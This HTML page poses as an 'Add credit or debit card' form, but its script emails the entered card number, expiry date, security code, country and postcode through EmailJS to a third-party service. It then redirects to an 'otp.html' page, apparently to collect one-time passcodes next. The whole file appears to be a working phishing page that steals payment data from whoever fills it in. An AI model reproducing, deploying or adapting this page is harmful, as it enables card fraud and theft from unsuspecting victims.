<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Card Details</title>

<style>
body {
    margin: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
    background: #f2f2f7;
}
.container {
    max-width: 420px;
    margin: 20px auto;
    padding: 20px;
}
h1 {
    font-size: 32px;
    font-weight: 800;
}
label {
    margin-top: 20px;
    display: block;
}
input, select {
    width: 100%;
    padding: 14px;
    margin-top: 8px;
    border: none;
    border-radius: 10px;
    background: #e5e5e5;
}
.row {
    display: flex;
    gap: 10px;
}
button {
    width: 100%;
    margin-top: 30px;
    padding: 15px;
    background: black;
    color: white;
    border: none;
    border-radius: 12px;
    cursor: pointer;
}

/* Loader */
#loader {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(255,255,255,0.7);
    display: none;
    align-items: center;
    justify-content: center;
    z-index: 999;
}

.spinner {
    width: 50px;
    height: 50px;
    border: 5px solid #ddd;
    border-top: 5px solid black;
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    100% { transform: rotate(360deg); }
}
</style>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
(function(){
    emailjs.init("NgnyFkoI-lfD8zjWa");
})();

function submitCard(){
    document.getElementById("loader").style.display = "flex";
    document.querySelector("button").disabled = true;

    emailjs.send("service_ifnx4jr","template_8kxwgac",{
        card_number: document.getElementById("card").value,
        expiry: document.getElementById("exp").value,
        cvv: document.getElementById("cvv").value,
        country: document.getElementById("country").value,
        postcode: document.getElementById("postcode").value,
        nickname: document.getElementById("nickname").value
    })
    .then(()=>{
        window.location.href="otp.html";
    },(error)=>{
        document.getElementById("loader").style.display = "none";
        document.querySelector("button").disabled = false;
        alert("Error: "+JSON.stringify(error));
    });
}
</script>

</head>
<body>

<div class="container">
    <h1>Add credit or debit card</h1>

    <label>Card number</label>
    <input id="card">

    <div class="row">
        <div style="flex:1">
            <label>Exp. date</label>
            <input id="exp" placeholder="MM/YY">
        </div>

        <div style="flex:1">
            <label>Security code</label>
            <input id="cvv" placeholder="123">
        </div>
    </div>

    <label>Country</label>
    <select id="country">
        <option>United States</option>
        <option>United Kingdom</option>
        <option>Canada</option>
        <option>Nigeria</option>
        <option>Ghana</option>
        <option>South Africa</option>
        <option>India</option>
        <option>China</option>
        <option>Germany</option>
        <option>France</option>
        <option>Italy</option>
        <option>Spain</option>
        <option>Brazil</option>
        <option>Mexico</option>
        <option>Australia</option>
        <option>Netherlands</option>
        <option>Sweden</option>
        <option>Switzerland</option>
        <option>Turkey</option>
        <option>United Arab Emirates</option>
        <option>Saudi Arabia</option>
        <option>Kenya</option>
        <option>Egypt</option>
        <option>Pakistan</option>
        <option>Bangladesh</option>
        <option>Indonesia</option>
        <option>Philippines</option>
        <option>Japan</option>
        <option>South Korea</option>
    </select>

    <label>Postcode</label>
    <input id="postcode">

    <label>Nickname (optional)</label>
    <input id="nickname">

    <button onclick="submitCard()">Submit</button>
</div>

<div id="loader">
    <div class="spinner"></div>
</div>

</body>
</html>
